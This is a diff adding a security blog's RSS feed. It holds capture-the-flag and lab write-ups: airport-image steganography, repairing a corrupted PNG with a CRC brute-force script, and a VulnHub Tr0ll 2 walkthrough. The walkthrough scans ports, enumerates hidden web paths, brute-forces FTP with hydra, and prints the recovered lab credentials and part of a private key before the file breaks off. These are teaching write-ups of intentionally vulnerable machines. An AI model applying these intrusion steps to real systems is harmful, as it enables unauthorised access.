@@ -1,0 +1,588 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Giulio &#39;peperunas&#39; De Pasquale on Giulio &#39;peperunas&#39; De Pasquale</title>
+    <link>https://blog.giugl.io/</link>
+    <description>Recent content in Giulio &#39;peperunas&#39; De Pasquale on Giulio &#39;peperunas&#39; De Pasquale</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <copyright>&amp;copy; 2017 Giulio De Pasquale</copyright>
+    <lastBuildDate>Wed, 20 Apr 2016 00:00:00 +0000</lastBuildDate>
+    <atom:link href="/" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>Injectopi</title>
+      <link>https://blog.giugl.io/project/injectopi/</link>
+      <pubDate>Mon, 24 Apr 2017 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.giugl.io/project/injectopi/</guid>
+      <description>&lt;p&gt;Lorem ipsum dolor sit amet, consectetur adipiscing elit. Duis posuere tellus ac convallis placerat. Proin tincidunt magna sed ex sollicitudin condimentum. Sed ac faucibus dolor, scelerisque sollicitudin nisi. Cras purus urna, suscipit quis sapien eu, pulvinar tempor diam. Quisque risus orci, mollis id ante sit amet, gravida egestas nisl. Sed ac tempus magna. Proin in dui enim. Donec condimentum, sem id dapibus fringilla, tellus enim condimentum arcu, nec volutpat est felis vel metus. Vestibulum sit amet erat at nulla eleifend gravida.&lt;/p&gt;
+
+&lt;p&gt;Nullam vel molestie justo. Curabitur vitae efficitur leo. In hac habitasse platea dictumst. Sed pulvinar mauris dui, eget varius purus congue ac. Nulla euismod, lorem vel elementum dapibus, nunc justo porta mi, sed tempus est est vel tellus. Nam et enim eleifend, laoreet sem sit amet, elementum sem. Morbi ut leo congue, maximus velit ut, finibus arcu. In et libero cursus, rutrum risus non, molestie leo. Nullam congue quam et volutpat malesuada. Sed risus tortor, pulvinar et dictum nec, sodales non mi. Phasellus lacinia commodo laoreet. Nam mollis, erat in feugiat consectetur, purus eros egestas tellus, in auctor urna odio at nibh. Mauris imperdiet nisi ac magna convallis, at rhoncus ligula cursus.&lt;/p&gt;
+
+&lt;p&gt;Cras aliquam rhoncus ipsum, in hendrerit nunc mattis vitae. Duis vitae efficitur metus, ac tempus leo. Cras nec fringilla lacus. Quisque sit amet risus at ipsum pharetra commodo. Sed aliquam mauris at consequat eleifend. Praesent porta, augue sed viverra bibendum, neque ante euismod ante, in vehicula justo lorem ac eros. Suspendisse augue libero, venenatis eget tincidunt ut, malesuada at lorem. Donec vitae bibendum arcu. Aenean maximus nulla non pretium iaculis. Quisque imperdiet, nulla in pulvinar aliquet, velit quam ultrices quam, sit amet fringilla leo sem vel nunc. Mauris in lacinia lacus.&lt;/p&gt;
+
+&lt;p&gt;Suspendisse a tincidunt lacus. Curabitur at urna sagittis, dictum ante sit amet, euismod magna. Sed rutrum massa id tortor commodo, vitae elementum turpis tempus. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Aenean purus turpis, venenatis a ullamcorper nec, tincidunt et massa. Integer posuere quam rutrum arcu vehicula imperdiet. Mauris ullamcorper quam vitae purus congue, quis euismod magna eleifend. Vestibulum semper vel augue eget tincidunt. Fusce eget justo sodales, dapibus odio eu, ultrices lorem. Duis condimentum lorem id eros commodo, in facilisis mauris scelerisque. Morbi sed auctor leo. Nullam volutpat a lacus quis pharetra. Nulla congue rutrum magna a ornare.&lt;/p&gt;
+
+&lt;p&gt;Aliquam in turpis accumsan, malesuada nibh ut, hendrerit justo. Cum sociis natoque penatibus et magnis dis parturient montes, nascetur ridiculus mus. Quisque sed erat nec justo posuere suscipit. Donec ut efficitur arcu, in malesuada neque. Nunc dignissim nisl massa, id vulputate nunc pretium nec. Quisque eget urna in risus suscipit ultricies. Pellentesque odio odio, tincidunt in eleifend sed, posuere a diam. Nam gravida nisl convallis semper elementum. Morbi vitae felis faucibus, vulputate orci placerat, aliquet nisi. Aliquam erat volutpat. Maecenas sagittis pulvinar purus, sed porta quam laoreet at.&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>ShieldFS: A Self-healing, Ransomware-aware Filesystem</title>
+      <link>https://blog.giugl.io/publication/shieldfs/</link>
+      <pubDate>Thu, 01 Dec 2016 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.giugl.io/publication/shieldfs/</guid>
+      <description></description>
+    </item>
+    
+    <item>
+      <title>Bash e Filtri (in Italian)</title>
+      <link>https://blog.giugl.io/talk/bashfiltri2016/</link>
+      <pubDate>Wed, 06 Apr 2016 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.giugl.io/talk/bashfiltri2016/</guid>
+      <description>&lt;p&gt;I held a talk for the &lt;a href=&#34;https://poul.org&#34; target=&#34;_blank&#34;&gt;POuL&lt;/a&gt; association whose I proudly am member.
+Here I&amp;rsquo;ve shown to intermediate *nix users, how to move the first steps with &lt;code&gt;bash&lt;/code&gt; and its main components.&lt;/p&gt;
+
+&lt;p&gt;The talk was held in Italian.&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>CSAW 2015 - Airport</title>
+      <link>https://blog.giugl.io/post/csaw15-airport/</link>
+      <pubDate>Wed, 23 Sep 2015 16:56:59 +0200</pubDate>
+      
+      <guid>https://blog.giugl.io/post/csaw15-airport/</guid>
+      <description>&lt;p&gt;In this challenge we were provided with 5 images:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;├── 1.png
+├── 2.png
+├── 3.png
+├── 4.png
+└── steghide.jpg
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The folder listing was a strong hint nevertheless: our objective was to extract something from &lt;code&gt;steghide.jpg&lt;/code&gt;  but first we had to get the proper passphrase for it.&lt;/p&gt;
+
+&lt;h1 id=&#34;how&#34;&gt;How?&lt;/h1&gt;
+
+&lt;p&gt;Each image shown a different airport: the first thing to do was recognizing each one. We mainly used &lt;a href=&#34;https://www.tineye.com/&#34; target=&#34;_blank&#34;&gt;TinEye&lt;/a&gt; and &lt;a href=&#34;https://www.imageraider.com/&#34; target=&#34;_blank&#34;&gt;Image Raider&lt;/a&gt;.
+After uploading each image, we were able to name the first, second and fourth airport while the third one wasn&amp;rsquo;t found on those search engines.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;1.png -&amp;gt; Jose Marti
+2.png -&amp;gt; Hong Kong
+4.png -&amp;gt; Pearson
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;To get the third one, we searched the web for the main roads near the airport, in order to get some helpful information: this resulted in finding the airport name in just a few minutes.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;3.png -&amp;gt; Los Angeles
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h1 id=&#34;what-about-the-key&#34;&gt;What about the key?&lt;/h1&gt;
+
+&lt;p&gt;Once we had pinned down each airport, it was trivial to think that the key would be the concatenation of each airport&amp;rsquo;s IATA code or name (following the image numbering).
+The first try gave us the following string which we used as possible key for &lt;code&gt;steghide.jpg&lt;/code&gt;: &lt;code&gt;HAVHKGLAXYYZ&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h1 id=&#34;may-i-haz-flag&#34;&gt;May I haz flag?&lt;/h1&gt;
+
+&lt;pre&gt;&lt;code&gt;$ &amp;gt; steghide extract -sf steghide.jpg
+Enter passphrase:
+wrote extracted data to &amp;quot;key.txt&amp;quot;.
+$ &amp;gt; cat key.txt
+iH4t3A1rp0rt5%
+&lt;/code&gt;&lt;/pre&gt;</description>
+    </item>
+    
+    <item>
+      <title>Plaid CTF 2015 - PNG Uncorrupt</title>
+      <link>https://blog.giugl.io/post/plaid15-png_uncorrupt/</link>
+      <pubDate>Fri, 12 Jun 2015 16:57:09 +0200</pubDate>
+      
+      <guid>https://blog.giugl.io/post/plaid15-png_uncorrupt/</guid>
+      <description>&lt;p&gt;Me and my team, &lt;a href=&#34;https://www.polictf.it&#34; target=&#34;_blank&#34;&gt;Tower of Hanoi&lt;/a&gt;, have played the PlaidCTF 2015: while my teammates did reversing stuff, my friend john and I did this awesome forensic challenge.&lt;/p&gt;
+
+&lt;p&gt;This was the challenge description:&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;We received this PNG file, but we&amp;rsquo;re a bit concerned the transmission may have not quite been perfect.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;It was easy to understand we had to repair a PNG file, but first, we checked what we had in our hands. So, we ran &lt;code&gt;file&lt;/code&gt; on the challenge file:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;corrupt_735acee15fa4f3be8ecd0c6bcf294fd4.png: data
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The file was, in fact, corrupted since it wasn&amp;rsquo;t recognized as a PNG image. The next step was to recreate the correct PNG header in our file, which should have been
+&lt;code&gt;0x89 0x50 0x4E 0x47 0xD 0xA 0x1A 0xA&lt;/code&gt; instead of &lt;code&gt;0x89 0x50 0x4E 0x47 0x0A 0x1A 0x0A&lt;/code&gt;, the actual header of our challenge&amp;rsquo;s file.&lt;/p&gt;
+
+&lt;p&gt;With the help of a hex editor we added the missing &lt;code&gt;0x0D&lt;/code&gt; byte, renamed the file and&amp;hellip;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;solution.png: PNG image data, 960 x 600, 8-bit/color RGB, non-interlaced
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Bad news ahead: by opening the image we were greeted by a fantastic &lt;em&gt;960x600&lt;/em&gt; black image. Not bad. Some of the PNG &lt;em&gt;chunks&lt;/em&gt; must have been corrupted as well then.&lt;/p&gt;
+
+&lt;p&gt;Before going further with the challenge details, I&amp;rsquo;d like to &lt;em&gt;quickly&lt;/em&gt; summarize how a PNG file actually is.&lt;/p&gt;
+
+&lt;p&gt;A PNG image has a lot of blocks, called &lt;em&gt;chunks&lt;/em&gt;, which have the same structure:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;|&amp;lt;- 4 bytes -&amp;gt;| |&amp;lt;- 4 bytes -&amp;gt;| |&amp;lt;- variable -&amp;gt;| |&amp;lt;- 4 bytes  -&amp;gt;|
+|&amp;lt;- LENGTH  -&amp;gt;| |&amp;lt;-   NAME  -&amp;gt;| |&amp;lt;-   DATA   -&amp;gt;| |&amp;lt;- CHECKSUM -&amp;gt;|
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The most important one, which actually represents the image, is called &lt;strong&gt;IDAT&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;Now: we made a strong assumption.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Every chunks&amp;rsquo; checksum and length section weren&amp;rsquo;t altered at all&lt;/strong&gt; (in this way we could understand what was the original content of the data block in each chunk)&lt;/p&gt;
+
+&lt;p&gt;With the aforementioned assumption in our mind, we checked if any chunk had an unexpected checksum: &lt;code&gt;pngcheck&lt;/code&gt; helped us doing this.&lt;/p&gt;
+
+&lt;p&gt;There were several corrupted &lt;strong&gt;IDAT&lt;/strong&gt; chunks so we wrote a script to bruteforce the missing bytes of each chunk.&lt;/p&gt;
+
+&lt;p&gt;What we thought was: the &lt;strong&gt;LENGTH&lt;/strong&gt; section indicates how many bytes &lt;em&gt;should have&lt;/em&gt; been in the chunk in the first place so we compared that value with the &lt;em&gt;actual&lt;/em&gt; length of the corrupted image &lt;strong&gt;DATA&lt;/strong&gt; section.&lt;/p&gt;
+
+&lt;p&gt;We wrote the script and&amp;hellip; it took a lifetime. No results. Much joy.&lt;/p&gt;
+
+&lt;p&gt;When our hope was gone and our PCs were slowly turning in frying pans, &lt;a href=&#34;https://github.com/esseks&#34; target=&#34;_blank&#34;&gt;&lt;strong&gt;esseks&lt;/strong&gt;&lt;/a&gt; another awesome teammate, came to the rescue.&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;Guys, text conversion.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Which meant: &lt;em&gt;why would you bruteforce everything?&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;When an image is downloaded as &lt;em&gt;text&lt;/em&gt; through FTP (ASCII Mode), each &lt;code&gt;0x0D 0x0A&lt;/code&gt; bytes tuple (&lt;code&gt;\r\n&lt;/code&gt;) is truncated to &lt;code&gt;0x0A&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Long story short, here&amp;rsquo;s what we did next:&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;Edited the script making it output the offset in the file where the &lt;code&gt;0x0D&lt;/code&gt; byte should have been appended&lt;/li&gt;
+&lt;li&gt;Waited for the script to do its magic&lt;/li&gt;
+&lt;li&gt;Edited by hand the PNG image &lt;em&gt;(sad but true)&lt;/em&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;Did we succeed?&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog.giugl.io/img/pngcorrupt.png&#34; alt=&#34;Final Solution&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;PS: I know that some of you was wondering how wonderful our script was&amp;hellip;so&amp;hellip; have a good headache after it ;-)&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import mmap
+import struct
+from zlib import crc32
+import re
+import sys
+try:
+    def strtobytes(x): return bytes(x)
+    def bytestostr(x): return str(x)
+except (NameError, TypeError):
+    strtobytes = str
+    bytestostr = str
+
+class IDATChunk:
+    counter = &amp;quot;&amp;quot;
+    length = &amp;quot;&amp;quot;
+    data = &amp;quot;&amp;quot;
+    checksum = &amp;quot;&amp;quot;
+    def __init__(self, counter, length, data, checksum):
+        self.counter = counter
+        self.length = int(length.encode(&amp;quot;hex&amp;quot;), 16)
+        self.data = data
+        self.checksum = checksum
+
+def verifyChecksum(data, checksum):
+    verify = crc32(strtobytes(&amp;quot;IDAT&amp;quot;))
+    verify = crc32(data, verify)
+    verify &amp;amp;= 2**32 - 1
+    verify = struct.pack(&#39;!I&#39;, verify)
+    if verify != checksum:
+        return False
+    return True
+
+
+def print_bar(perc=.0):
+    SIZE = 20
+    return &amp;quot;[%s%s] %f\r&amp;quot; % (&amp;quot;#&amp;quot; * int(20*perc), &amp;quot; &amp;quot; * (20 - int(20*perc)), perc)
+
+
+def addNewByte(data, seek = &amp;quot;\n&amp;quot;, debug=False, byte_to_insert = &amp;quot;\r&amp;quot;):
+    if debug:
+        print &amp;quot;DEBUG!!!&amp;quot;, type(data), data
+    indexes = [m.start() for m in re.finditer(seek, data)]
+    for i in indexes:
+        if byte_to_insert is None:
+            for byte_to_insert in range(255):
+                new_data = data[:i]+ chr(byte_to_insert) + data[i:]
+                yield str(new_data), i, byte_to_insert, len(indexes)
+        else:
+            new_data = data[:i]+ byte_to_insert + data[i:]
+            yield str(new_data), i, byte_to_insert, len(indexes)
+
+
+
+def getCorrectData(idatobj):
+    if idatobj.length - len(idatobj.data) == 1 :
+        for new_data, i, byte_to_insert, num in addNewByte(idatobj.data):
+            if verifyChecksum(new_data, idatobj.checksum):
+                print &amp;quot;Offset byte: &amp;quot;, str(i), repr(byte_to_insert)
+                return new_data
+
+    elif idatobj.length - len(idatobj.data) == 2 :
+        counter = 0
+        for data_plus_1, i1, byte_1, num in addNewByte(idatobj.data):
+            for data_plus_2, i2, byte_2, num2 in addNewByte(data_plus_1):
+                sys.stderr.write(print_bar(float(counter)/255/255/num))
+                counter += 1
+                if verifyChecksum(data_plus_2, idatobj.checksum):
+                    print &amp;quot;Offset byte 1: &amp;quot;, str(i1), &amp;quot; Byte: &amp;quot;, repr(byte_1)
+                    print &amp;quot;Offset byte 2: &amp;quot;, str(i2), &amp;quot; Byte: &amp;quot;, repr(byte_2)
+                    return data_plus_2
+    elif idatobj.length - len(idatobj.data) == 3 :
+        counter = 0
+        for data_plus_1, i1, byte_1, num in addNewByte(idatobj.data):
+            for data_plus_2, i2, byte_2, num in addNewByte(data_plus_1):
+                for data_plus_3, i3, byte_3, num in addNewByte(data_plus_2):
+                    sys.stderr.write(print_bar(float(counter)/255/255/255))
+                    counter += 1
+                    if verifyChecksum(data_plus_3, idatobj.checksum):
+                        print &amp;quot;Offset byte 1: &amp;quot;, str(i1), &amp;quot; Byte: &amp;quot;, repr(byte_1)
+                        print &amp;quot;Offset byte 2: &amp;quot;, str(i2), &amp;quot; Byte: &amp;quot;, repr(byte_2)
+                        print &amp;quot;Offset byte 3: &amp;quot;, str(i3), &amp;quot; Byte: &amp;quot;, repr(byte_3)
+                        return data_plus_3
+def getlen(mm, idatindex):
+    return int(&amp;quot;0x&amp;quot; + mm[idatindex-4:idatindex].encode(&amp;quot;hex&amp;quot;), 0)
+
+idat_chunks = []
+
+f = open(&#39;/home/giulio/CTF/Plaid5/forensics/original.png&#39;, &amp;quot;r+b&amp;quot;)
+mm = mmap.mmap(f.fileno(), 0)
+#
+# L | IDAT | DATA | CHECKSUM ---&amp;gt; {L} {DATA, CHECKSUM, L} {DATA, CHECKSUM, L} ... {DATA, CHECKSUM}
+#
+shitgotreal = mm.read(mm.size()).split(&amp;quot;Adobe Fireworks CS6&amp;quot;)[1][4:].split(&amp;quot;IEND&amp;quot;)[0].split(&amp;quot;IDAT&amp;quot;)
+
+for cont, idat in [ (x,shitgotreal[x])  for x in range(1, len(shitgotreal))]:
+    length = shitgotreal[cont-1][-4:]
+    data = idat[:-8]
+    checksum = idat[-8:-4]
+    idat_chunks.append(IDATChunk(cont,length, data, checksum))
+for x in idat_chunks:
+    print &amp;quot;IDAT &amp;quot; + str(x.counter) + &amp;quot;: ...&amp;quot;
+    getCorrectData(x)
+    print &amp;quot;|------|&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;</description>
+    </item>
+    
+    <item>
+      <title>VulnHub Tr0ll 2 VM write-up</title>
+      <link>https://blog.giugl.io/post/vm-troll2/</link>
+      <pubDate>Sat, 20 Dec 2014 16:56:53 +0200</pubDate>
+      
+      <guid>https://blog.giugl.io/post/vm-troll2/</guid>
+      <description>&lt;p&gt;&lt;div class=&#34;alert alert-warning&#34;&gt;
+  &lt;p&gt;&lt;strong&gt;Due to my blog transfer I lost some articles bits. This, unfortunately, is one of them. I’ll re-write (complete) this article soon. I’m very sorry.&lt;/strong&gt;&lt;/p&gt;
+
+&lt;/div&gt;
+
+Here we are. After having downloaded and booted the VM I’m greeted by a fantastic ASCII art banner. Isn’t it lovely?
+&lt;/p&gt;
+
+&lt;p&gt;I did a quick scan and port 21, 22 and 80 were open.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;PORT STATE SERVICE VERSION
+21/tcp open ftp vsftpd 2.0.8 or later
+22/tcp open ssh OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
+80/tcp open http Apache httpd 2.2.22 ((Ubuntu))
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Sincerely, I didn’t look for any known vulnerability and jumped immediately on the FTP server.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;220 Welcome to Tr0ll FTP... Only noobs stay for a while...
+Name (trollvm:giulio):
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Hmmm… no good. There’s no anonymous login. I needed to find another way. What’s in the HTTP server then?
+That was the image in the root of the Apache server. There were no clues in the page source either:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;html&amp;gt;
+    &amp;lt;img src=&#39;tr0ll_again.jpg&#39;&amp;gt;
+&amp;lt;/html&amp;gt;
+
+&amp;lt;!--Nothing here, Try Harder!&amp;gt;
+&amp;lt;!--Author: Tr0ll&amp;gt;
+&amp;lt;!--Editor: VIM&amp;gt;
+&amp;lt;!--&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The thing I did next was checking for some robot-blacklisted directory in the &lt;code&gt;robots.txt&lt;/code&gt; file. Maybe I could get something useful out of it.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;User-agent:*
+Disallow:
+/noob
+/nope
+/try_harder
+/keep_trying
+/isnt_this_annoying
+/nothing_here
+/404
+/LOL_at_the_last_one
+/trolling_is_fun
+/zomg_is_this_it
+/you_found_me
+/I_know_this_sucks
+/You_could_give_up
+/dont_bother
+/will_it_ever_end
+/I_hope_you_scripted_this
+/ok_this_is_it
+/stop_whining
+/why_are_you_still_looking
+/just_quit
+/seriously_stop
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Nice list eh? I’ve taken the suggestion in the file (“I hope you scripted this”) and I quickly wrote a Python script which opened each folder and showed me the results:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from http.client import HTTPResponse
+from urllib import request
+req = request.urlopen(&amp;quot;http://192.168.1.63/robots.txt&amp;quot;)
+for line in req:
+    if line.decode(&#39;utf-8&#39;).startswith(&#39;/&#39;):
+        test_url = &amp;quot;http://192.168.1.63&amp;quot;
+        test_url += line.decode(&#39;utf-8&#39;)
+        try:
+            print (line.decode(&#39;utf-8&#39;))
+            print (request.urlopen(test_url).read())
+        except:
+            print (&amp;quot;Page not found&amp;quot;)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;And I got this:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;/noob
+&amp;lt;html&amp;gt;
+&amp;lt;img src=&#39;cat_the_troll.jpg&#39;&amp;gt;
+&amp;lt;!--What did you really think to find here? Try Harder!&amp;gt;
+&amp;lt;/html&amp;gt;
+/nope
+Page not found
+/try_harder
+Page not found
+/keep_trying
+&amp;lt;html&amp;gt;
+&amp;lt;img src=&#39;cat_the_troll.jpg&#39;&amp;gt;
+&amp;lt;!--What did you really think to find here? Try Harder!&amp;gt;
+&amp;lt;/html&amp;gt;
+/isnt_this_annoying
+Page not found
+/nothing_here
+Page not found
+/404
+Page not found
+/LOL_at_the_last_one
+Page not found
+/trolling_is_fun
+Page not found
+/zomg_is_this_it
+Page not found
+/you_found_me
+Page not found
+/I_know_this_sucks
+Page not found
+/You_could_give_up
+Page not found
+/dont_bother
+&amp;lt;html&amp;gt;
+&amp;lt;img src=&#39;cat_the_troll.jpg&#39;&amp;gt;
+&amp;lt;!--What did you really think to find here? Try Harder!&amp;gt;
+&amp;lt;/html&amp;gt;
+/will_it_ever_end
+Page not found
+/I_hope_you_scripted_this
+Page not found
+/ok_this_is_it
+&amp;lt;html&amp;gt;
+&amp;lt;img src=&#39;cat_the_troll.jpg&#39;&amp;gt;
+&amp;lt;!--What did you really think to find here? Try Harder!&amp;gt;
+&amp;lt;/html&amp;gt;
+/stop_whining
+Page not found
+/why_are_you_still_looking
+Page not found
+/just_quit
+Page not found
+/seriously_stop
+Page not found
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;So, the only existing folders were &lt;code&gt;noob&lt;/code&gt;, &lt;code&gt;keep_trying&lt;/code&gt;, &lt;code&gt;dont_bother&lt;/code&gt; and &lt;code&gt;ok_this_is_it&lt;/code&gt;.
+Here’s where I got stuck. I was missing something for sure. So I thought that maybe Maleus used some steganography technique so I tried using &lt;code&gt;steghide&lt;/code&gt;. That lead nowhere. Damn.
+Then it struck me. Maybe the cat photos are different in some way.. I checked that out and I was right.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;3f0745a5f922cdebc591d5d74076c31bb6a93a8f1e1e351f91ec3ee32e980affcc0a8618b36c1ef7761a5687c1e640b5af0f5736fde8380d4a890060ef079a6b cat_the_troll (2).jpg
+1367f1a2bc4f74bf636e8359a3e99caaf85e093ae1bf4348c969b133bf7e95445d8b6b97a03b9a7c425b9a42b5ac0b63eaa5b6e478b7b26ccf94a11424bdef9f cat_the_troll (3).jpg
+3f0745a5f922cdebc591d5d74076c31bb6a93a8f1e1e351f91ec3ee32e980affcc0a8618b36c1ef7761a5687c1e640b5af0f5736fde8380d4a890060ef079a6b cat_the_troll (4).jpg
+3f0745a5f922cdebc591d5d74076c31bb6a93a8f1e1e351f91ec3ee32e980affcc0a8618b36c1ef7761a5687c1e640b5af0f5736fde8380d4a890060ef079a6b cat_the_troll.jpg
+ed0b7173ca8e9e47f59f3051bddbd6c0470394be155c2ae2b28911cbe4251b7cab87cdcdb57496b81458009c4a11cd308ea7039d6984b1267f6780285a694db1 tr0ll_again.jpg
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Hidden in plain sight in one of those cat photos, in my case &lt;code&gt;cat_the_troll (3)&lt;/code&gt;, there was a string, recovered through a quick use of the &lt;code&gt;strings&lt;/code&gt; command, which said:&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;“Look Deep within y0ur_self for the answer“&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;I opened the &lt;code&gt;y0ur_self&lt;/code&gt; directory on the HTTP server and there was a 1MB long &lt;code&gt;answer.txt&lt;/code&gt; file waiting to be download. Let’s check that answer then!&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;[... BIG snip ...]
+Y29sbG9xdWl1bQo=
+Y29sbG9xdWl1bXMK
+Y29sbG9xdXkK
+Y29sb24K
+Y29tYmluZXMK
+Y29tYmluZwo=
+Y29tYmluaW5nCg==
+Y29tYm8K
+Y29tYm8K
+[ ... VERY VERY VERY BIG snip ... ]
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;A base64 encoded dictionary!? Which one is the correct one? But, even more important… what answer to which question? The FTP server?&lt;/p&gt;
+
+&lt;p&gt;So I thought that the original clue,  &lt;strong&gt;“Look Deep within y0ur_self for the answer“&lt;/strong&gt;, could be somewhere in this file. I coded another little Python script which tried every permutation of the clue, encoded it to base64 and wrote it to a file named &lt;code&gt;results.txt&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from base64 import b64encode
+from itertools import permutations
+phrase = &amp;quot;Look Deep within y0ur_self for the answer&amp;quot;
+with open(&amp;quot;results.txt&amp;quot;, &amp;quot;w&amp;quot;) as f:
+    for len in range(1, len(phrase.split())):
+    list = permutations(phrase.split(), len)
+    for permutation in list:
+        string = &amp;quot; &amp;quot;.join(permutation)
+        b64_string = b64encode(bytes(string, &#39;utf-8&#39;))
+        f.write(str(b64_string.decode(&#39;utf-8&#39;)))
+    f.write(&amp;quot;\n&amp;quot;)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;After having created the &lt;code&gt;results.txt&lt;/code&gt; file I tried to check whether some string was contained in the original &lt;code&gt;answer.txt&lt;/code&gt; file. No luck. Daaaamn part two.&lt;/p&gt;
+
+&lt;p&gt;After a while being stuck again, I realized I was stupid as noone ever was. I didn’t even try do DECODE the dictionary and get some “strange” word in it! So I did decode it and tried to retrieve some valuable word, maybe a very long key, through awk. What I did was:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;cat answer_decoded.txt | awk &#39;{ print length, $0 }&#39; | sort -n
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;What I got back was REALLY nice:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;19 interdenominational
+19 nonrepresentational
+19 oversimplifications
+20 Andrianampoinimerina
+20 counterrevolutionary
+20 electroencephalogram
+20 uncharacteristically
+21 electroencephalograms
+21 electroencephalograph
+22 counterrevolutionaries
+22 electroencephalographs
+30 ItCantReallyBeThisEasyRightLOL
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;strong&gt;“ItCantReallyBeThisEasyRight“&lt;/strong&gt;? That sounds great, I found something “valuable”… yeah… but… how should I use it?&lt;/p&gt;
+
+&lt;p&gt;Since I was not sure about that, I tried to search in the file for something else… something like &lt;em&gt;“lol“&lt;/em&gt;, &lt;em&gt;“troll“&lt;/em&gt;, &lt;em&gt;“noob“&lt;/em&gt;, &lt;em&gt;“rofl”&lt;/em&gt; and &lt;em&gt;”zomg“&lt;/em&gt;. I was lucky again, I guess.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;[...snip...]
+noooob_lol
+trollololol
+[...snip...]
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;With these 3 words plus the Tr0ll one (it appeared in the FTP Banner, do you remember?) I created a super-mini dictionary to use on the FTP server and I fired uphydra. And guess what? I got a match.&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;Tr0ll:Tr0ll&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;My dictionary was useless! Was I tr0lled again!?&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+&amp;gt; ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rw-r--r--  1 0    0      1474 Oct 04 00:09 lmao.zip
+226 Directory send OK.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Inside &lt;code&gt;lmao.zip&lt;/code&gt; there was another file called &lt;em&gt;“noob”&lt;/em&gt; which was password protected. BINGO! My dictionary maybe will come in handy this time!&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;-----BEGIN RSA PRIVATE KEY-----
+MIIEpAIBAAKCAQEAsIthv5CzMo5v663EMpilasuBIFMiftzsr+w+UFe9yFhAoLqq
+yDSPjrmPsyFePcpHmwWEdeR5AWIv/RmGZh0Q+Qh6vSPswix7//SnX/QHvh0CGhf1
+/9zwtJSMely5oCGOujMLjDZjryu1PKxET1CcUpiylr2kgD/fy11Th33KwmcsgnPo
+q+pMbCh86IzNBEXrBdkYCn222djBaq+mEjvfqIXWQYBlZ3HNZ4LVtG+5in9bvkU5
